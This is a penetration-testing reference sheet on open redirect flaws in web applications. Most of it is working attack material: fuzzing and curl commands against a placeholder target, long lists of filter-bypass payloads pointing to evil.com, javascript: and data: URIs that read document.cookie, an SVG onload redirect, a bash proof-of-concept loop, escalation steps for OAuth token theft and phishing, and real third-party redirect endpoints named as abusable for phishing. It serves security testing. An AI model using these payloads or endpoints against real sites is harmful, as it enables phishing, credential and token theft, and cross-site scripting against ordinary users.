# Open Redirect

> **Summary**: The application redirects users to an attacker-controlled URL via unvalidated user input in redirect parameters, enabling phishing, token theft, and chained attacks.
> **Impact**: Phishing credential theft, OAuth token interception, SSRF pivoting, and XSS via javascript: URIs.
> **Typical Severity**: Low | Medium (escalates to High when chained with OAuth or SSRF)

## Detection

### Indicators

Common redirect parameter names to look for in URLs:

```
url=, redirect=, next=, dest=, destination=, redir=, redirect_uri=,
redirect_url=, return=, returnTo=, return_to=, return_path=, go=,
forward=, forward_url=, out=, view=, target=, rurl=, callback=,
callback_url=, continue=, checkout_url=, image_url=, to=, link=,
location=, u=, uri=, q=, src=, data=, login=, logout=, ext=,
clickurl=, goto=, jump=, jump_url=, origin=, originUrl=, desturl=,
page=, action=, action_url=, sp_url=, service=, recurl=, backurl=,
RedirectUrl=, ReturnUrl=, success=, burl=, request=
```

### Automated Detection

```bash
# Gather historical URLs and filter for redirect parameters
cat domains.txt | gau --o urls.txt
rg -NI "(url=|next=|redir=|redirect|dest=|rurl=|return=|continue=|goto=|forward=)" urls.txt | sort -u > candidates.txt

# Fuzz with OpenRedireX
cat candidates.txt | openredirex -p payloads.txt -k FUZZ -c 50 > results.txt

# Check results for 30x redirects
awk '/30[1237]|Location:/I' results.txt
```

### Manual Detection

```bash
# Quick check if a parameter redirects externally
curl -s -I "https://target.com/redirect?url=https://evil.com" | grep -i "^Location:"
curl -s -I "https://target.com/login?next=//evil.com" | grep -i "^Location:"

# Check for client-side redirects (meta refresh, JS redirect)
curl -s "https://target.com/redirect?url=https://evil.com" | grep -iE "(location\s*=|window\.location|meta.*refresh|replace\()"
```

Also look for client-side redirect sinks in SPAs: `window.location`, `location.assign()`, `location.replace()`, and framework helpers that read query/hash and redirect.

## Exploitation

### Prerequisites

- A redirect parameter that accepts user-controlled input.
- The application does not properly validate the redirect destination against a strict allowlist.

### Step-by-Step

1. Identify a redirect parameter (check URL params, POST body, Referer header).
2. Set the parameter value to an external domain and observe if the redirect occurs.
3. If blocked, apply bypass payloads from the list below (encoding, protocol-relative, etc.).
4. Validate the redirect by checking the `Location` header or observing browser navigation.
5. Escalate: use the redirect in an OAuth flow to steal tokens, or chain with SSRF/XSS.

### Payloads

#### Basic Redirect Payloads

```
https://evil.com
http://evil.com
//evil.com
```

#### Protocol-Relative Bypass

Using `//` to bypass `http` blacklisted keyword:

```
//evil.com
///evil.com
////evil.com
```

#### Using "https:" to Bypass "//" Blacklist

```
https:evil.com
```

#### Backslash Tricks

Using `/\/` to bypass `//` blacklisted keyword:

```
\/\/evil.com/
/\/evil.com/
/\evil.com
```

#### @ Userinfo Trick

Browser redirects to anything after the `@`:

```
http://trusted.com@evil.com/
https://trusted.com@evil.com/
http://trusted.com%40evil.com
```

#### Backslash Parsing Confusion

Some backends treat `\` as a path char; browsers normalize to `/` and interpret the host as userinfo:

```
https://trusted.com\@evil.com/
```

#### URL Encoding Bypasses

```
https://evil%2Ecom
https://evil%00.com
https://evil.com%00trusted.com
https://evil.com%0d%0atrusted.com
```

#### Double Encoding

```
https://evil%252Ecom
%2568ttps://evil.com
```

#### Unicode Character Bypass

Using `%E3%80%82` to bypass `.` blacklisted character (fullwidth dot):

```
//evil%E3%80%82com
```

#### Null Byte Injection

```
//evil%00.com
https://evil.com%00@trusted.com
```

#### Tab and Newline Injection

```
//evil%09.com
//evil%0a.com
//evil%0d.com
java%0d%0ascript:alert(1)
```

#### Parameter Pollution

```
?next=trusted.com&next=evil.com
```

#### Hostname/Domain Tricks

```
# Subdomain matching bypass
https://trusted.com.evil.com
https://evil.com/trusted.com
https://trustedcom.evil.com

# Trailing dot
https://evil.com.

# IPv4/IPv6 alternatives (for localhost allowlist bypass)
http://127.0.0.1
http://127.1
http://2130706433
http://0x7f000001
http://[::1]
http://[::ffff:127.0.0.1]

# Wildcard DNS resolving to loopback
http://127.0.0.1.sslip.io
http://lvh.me
http://localtest.me
```

#### Fragment and Data URI Tricks

```
# Fragment-based
https://trusted.com#@evil.com
//trusted.com#%0a//evil.com

# Data URI (client-side redirects)
data:text/html,<script>location='https://evil.com'</script>
data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0naHR0cHM6Ly9ldmlsLmNvbSc8L3NjcmlwdD4=
```

#### javascript: URI (Escalate to XSS)

```
javascript:alert(1)
java%0d%0ascript%0d%0a:alert(0)
javascript://trusted.com/%0Aalert(1)
javascript://%250Aalert(1)
javascript://%250Aalert(1)//?1
javascript://%250A1?alert(1):0
%09Jav%09ascript:alert(document.domain)
//%5cjavascript:alert(1);
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
jaVAscript://trusted.com//%0d%0aalert(1);//
javascript://trusted.com?%a0alert%281%29
/x:1/:///%01javascript:alert(document.cookie)/
```

#### SVG-Based Open Redirect

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com'" xmlns="http://www.w3.org/2000/svg">
</svg>
```

### Proof of Concept

```bash
# Verify an open redirect
curl -s -I "https://target.com/login?next=//evil.com" | grep -i location

# Test multiple bypass payloads
TARGET="https://target.com/redirect?url="
PAYLOADS=("//evil.com" "https://evil.com" "https://trusted.com@evil.com" "/\\evil.com" "//evil%E3%80%82com" "//evil%00.com" "https:evil.com" "\\/\\/evil.com")
for p in "${PAYLOADS[@]}"; do
    LOC=$(curl -s -I "${TARGET}${p}" | grep -i "^location:" | head -1)
    echo "$LOC  <-- $p"
done
```

## Bypasses

- When the app checks for the trusted domain as a substring, use `trusted.com.evil.com` or `evil.com/trusted.com`.
- When `//` is blocked, use `\/\/`, `/\`, `https:`, or `%2f%2f`.
- When `.` is blocked, use `%E3%80%82` (fullwidth ideographic dot) or `%2e`.
- When the scheme is enforced, use protocol-relative `//evil.com`.
- When only paths are accepted, use `/\evil.com` or `/..//evil.com`.
- When URL parsing differs between validator and redirect handler, use backslash confusion or encoded characters.
- Fragment smuggling + client-side traversal chains (see Grafana-style bypass: validator checks `URL.Path`, ignores `URL.Fragment`).

## Escalation

- **OAuth token theft**: Use the open redirect as the `redirect_uri` in an OAuth flow to steal authorization codes or tokens. See [OAuth](../authentication/oauth.md).
- **SSRF pivot**: If the redirect parameter is also fetched server-side, chain with [SSRF](ssrf.md) for internal access.
- **Phishing**: Use the trusted domain URL as a convincing phishing link that redirects to a cloned login page.
- **XSS**: Escalate via `javascript:` URI payloads when the redirect value is placed in `location`, `window.location`, or `<meta>` refresh.
- **CSRF bypass**: Open redirects can defeat Referer-based CSRF protections.
- **Cache poisoning**: Chain with web cache poisoning to serve malicious redirects to other users.

## Open Redirect Farming

1. Register a user and log in.
2. Navigate to a protected page (e.g., `/accounts/profile`).
3. Copy the profile URL.
4. Log out, clear cookies, and paste the profile URL.
5. The login page may appear with a redirect parameter (e.g., `/login?next=accounts/profile`).
6. Replace the redirect value with an external URL and test.

## Known Open Redirects (Third-Party Services)

These are known redirect endpoints on popular services that can be abused for phishing:

```
https://google.com/amp/s/evil.com
https://meet.google.com/linkredirect?dest=http://evil.com
https://www.google.com/search?btnI&q=http://evil.com
https://www.facebook.com/l.php?u=http://evil.com
https://www.youtube.com/redirect?q=http://evil.com
https://docs.google.com/gview?url=https://evil.com
```

## Tools

| Tool | Usage |
|---|---|
| [OpenRedireX](https://github.com/devanshbatham/OpenRedireX) | `cat urls.txt \| openredirex -p payloads.txt -k FUZZ -c 50` |
| [Oralyzer](https://github.com/r0075h3ll/Oralyzer) | `python3 oralyzer.py -u "https://target.com/redirect?url=FUZZ"` |
| [gau](https://github.com/lc/gau) | `echo target.com \| gau` (gather URLs with redirect params) |
| [waybackurls](https://github.com/tomnomnom/waybackurls) | `echo target.com \| waybackurls` (historical URL discovery) |
| [Burp Suite](https://portswigger.net) | Match & replace rules, Intruder for param fuzzing |

## References

- [HackTricks - Open Redirect](https://book.hacktricks.wiki/en/pentesting-web/open-redirect.html)
- [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- [Open Redirect Cheat Sheet - pentester.land](https://pentester.land/cheatsheets/2018/11/02/open-redirect-cheatsheet.html)
- [Open Redirect Payloads - cujanovic](https://github.com/cujanovic/Open-Redirect-Payloads)
- [PortSwigger - DOM-based Open Redirection](https://portswigger.net/web-security/dom-based/open-redirection)
- [Grafana CVE-2025-6023 Redirect + Traversal Bypass Chain](https://blog.ethiack.com/blog/grafana-cve-2025-6023-bypass-a-technical-deep-dive)
